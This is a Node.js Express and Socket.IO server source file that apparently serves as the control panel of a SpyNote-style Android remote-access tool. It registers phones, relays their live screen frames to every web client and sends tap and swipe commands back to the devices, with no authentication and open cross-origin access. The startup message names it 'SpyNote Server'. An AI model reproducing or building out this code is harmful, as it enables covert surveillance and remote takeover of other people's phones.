const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const compression = require('compression');

const app = express();
const server = http.createServer(app);

const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    pingTimeout: 60000,
    pingInterval: 25000
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json());

// ===============================
// DEVICE STORE
// ===============================
const devices = new Map();

// ===============================
// REST API
// ===============================
app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;

    if (deviceId) {
        devices.set(deviceId, {
            deviceId,
            model,
            brand,
            version,
            status: status || 'active',
            connected: true
        });

        console.log("📱 Device registered:", deviceId);
        io.emit('devices-update', Array.from(devices.entries()));
    }

    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

// ===============================
// SOCKET.IO
// ===============================
io.on('connection', (socket) => {
    console.log('🔌 New socket:', socket.id);

    /* ---------- DEVICE REGISTER ---------- */
    socket.on('register-device', (deviceInfo) => {
        if (!deviceInfo || !deviceInfo.deviceId) return;

        const deviceId = deviceInfo.deviceId;

        devices.set(deviceId, {
            ...deviceInfo,
            connected: true,
            socketId: socket.id
        });

        socket.join(deviceId);

        console.log('✅ Device connected:', deviceId);
        io.emit('devices-update', Array.from(devices.entries()));
    });

    /* ---------- RECEIVE SCREEN FRAME ---------- */
    socket.on('screen-frame', (data) => {
        if (!data || !data.deviceId) return;

        console.log(
            `📱 Frame received from ${data.deviceId}: ${data.width}x${data.height}`
        );

        try {
            // ✅ SEND TO ALL WEB CLIENTS
            io.emit('screen-frame', {
                deviceId: data.deviceId,
                data: data.data,
                width: data.width,
                height: data.height,
                timestamp: data.timestamp
            });

            // ✅ ALSO SEND TO DEVICE ROOM (OPTIONAL)
            socket.to(data.deviceId).emit('screen-frame', data);

        } catch (e) {
            console.error('❌ Frame send error:', e);
        }
    });

    /* ---------- CONTROL COMMANDS FROM WEB ---------- */
    socket.on('control', (data) => {
        const { deviceId } = data;
        if (!deviceId || !devices.has(deviceId)) return;

        console.log('🎮 Control:', data.action, '→', deviceId);

        socket.to(deviceId).emit('control', {
            action: data.action,
            x: Number(data.x) || 0,
            y: Number(data.y) || 0,
            startX: Number(data.startX) || 0,
            startY: Number(data.startY) || 0,
            endX: Number(data.endX) || 0,
            endY: Number(data.endY) || 0
        });
    });

    /* ---------- DISCONNECT ---------- */
    socket.on('disconnect', () => {
        console.log('❌ Disconnected:', socket.id);

        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, {
                    ...info,
                    connected: false
                });

                console.log('⚠️ Device offline:', deviceId);
                io.emit('devices-update', Array.from(devices.entries()));
                break;
            }
        }
    });
});

// ===============================
// START SERVER
// ===============================
const PORT = process.env.PORT || 3000;

server.listen(PORT, () => {
    console.log(`🚀 SpyNote Server running on port ${PORT}`);
    console.log(`🌐 Web panel: http://localhost:${PORT}`);
});
